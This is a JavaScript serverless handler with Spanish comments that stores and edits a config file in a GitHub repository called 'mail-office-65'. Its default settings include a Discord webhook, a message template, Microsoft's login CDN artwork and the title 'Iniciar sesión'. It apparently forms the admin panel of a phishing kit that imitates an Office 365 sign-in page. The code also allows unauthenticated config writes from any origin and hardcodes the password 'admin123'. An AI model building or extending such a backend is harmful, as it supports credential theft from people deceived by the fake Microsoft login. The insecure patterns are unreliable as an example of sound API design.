// API de configuración - GitHub-backed persistence
// Lee/escribe config.json desde el repositorio de GitHub usando la API REST

import { Buffer } from 'node:buffer';

const GH_TOKEN = process.env.GH_TOKEN || '';
const GH_OWNER = process.env.GH_OWNER || 'varasjaime777-alt';
const GH_REPO = process.env.GH_REPO || 'mail-office-65';
const CONFIG_PATH = 'config.json';
const GITHUB_API = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${CONFIG_PATH}`;

// Configuración por defecto
const DEFAULT_CONFIG = {
  discordWebhook: '',
  discordMessageTemplate: '',
  loginBgType: 'image',
  loginBgColor: '#0a0a1a',
  loginBgGradient: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)',
  loginBgImage: 'https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg',
  loginLogo: '',
  loginTitle: 'Iniciar sesión',
  loginDescription: '',
  adminPassword: 'admin123',
};

const headers = {
  'Authorization': `token ${GH_TOKEN}`,
  'Accept': 'application/vnd.github.v3+json',
  'User-Agent': 'MailOffice65/1.0',
  'X-GitHub-Api-Version': '2022-11-28',
};

async function githubRead() {
  const res = await fetch(GITHUB_API, { method: 'GET', headers });
  if (!res.ok) {
    if (res.status === 404) return { content: null, sha: null, etag: null };
    throw new Error(`GitHub read error: ${res.status} ${res.statusText}`);
  }
  const data = await res.json();
  const content = JSON.parse(Buffer.from(data.content, 'base64').toString('utf-8'));
  return { content, sha: data.sha, etag: data.etag };
}

async function githubWrite(content, sha) {
  const body = {
    message: 'Update config from admin panel',
    content: Buffer.from(JSON.stringify(content, null, 2)).toString('base64'),
  };
  if (sha) body.sha = sha;

  const res = await fetch(GITHUB_API, {
    method: 'PUT',
    headers,
    body: JSON.stringify(body),
  });
  if (!res.ok) throw new Error(`GitHub write error: ${res.status} ${res.statusText}`);
  return await res.json();
}

export default async function handler(req, res) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Methods', 'GET, PUT, PATCH, OPTIONS');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method === 'GET') {
    try {
      const { content, sha } = await githubRead();
      if (!content) {
        return res.status(200).json({ ...DEFAULT_CONFIG, _sha: null });
      }
      return res.status(200).json({ ...DEFAULT_CONFIG, ...content, _sha: sha });
    } catch (err) {
      console.error('Config read error:', err);
      // Fallback a defaults si GitHub falla
      return res.status(200).json({ ...DEFAULT_CONFIG });
    }
  }

  if (req.method === 'PUT' || req.method === 'PATCH') {
    try {
      const { content: existing, sha } = await githubRead();
      const updates = req.body || {};
      const merged = { ...DEFAULT_CONFIG, ...(existing || {}), ...updates };

      await githubWrite(merged, sha);
      return res.status(200).json({ ...merged, _sha: sha });
    } catch (err) {
      console.error('Config write error:', err);
      return res.status(500).json({ error: err.message });
    }
  }

  return res.status(405).json({ error: 'Método no permitido' });
}
